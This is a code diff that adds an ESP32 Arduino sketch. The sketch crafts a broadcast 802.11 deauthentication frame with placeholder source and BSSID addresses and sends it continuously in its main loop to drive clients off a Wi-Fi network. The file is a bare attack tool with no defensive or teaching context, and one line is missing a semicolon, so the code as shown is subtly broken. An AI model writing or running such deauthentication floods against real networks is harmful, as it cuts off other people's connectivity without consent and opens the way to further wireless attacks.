@@ -1,0 +1,27 @@
+// tommyfart was here
+
+const uint8_t packets[26] = {
+  0xc0, 0x00,
+  0x3a, 0x01,
+  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
+  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 
+  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 
+  0x00, 0x00,
+  0x07, 0x00
+};
+
+void deauth() {
+esp_wifi_80211_tx(WIFI_IF_STA, packets, sizeof(packets), false);
+  Serial.println("deauth packet sent\n")
+}
+
+void setup() {
+  Serial.begin(115200);
+  WiFi.mode(WIFI_STA);
+  esp_wifi_set_promiscuous(true);
+  delay(2000);
+}
+
+void loop() {
+  deauth();
+}
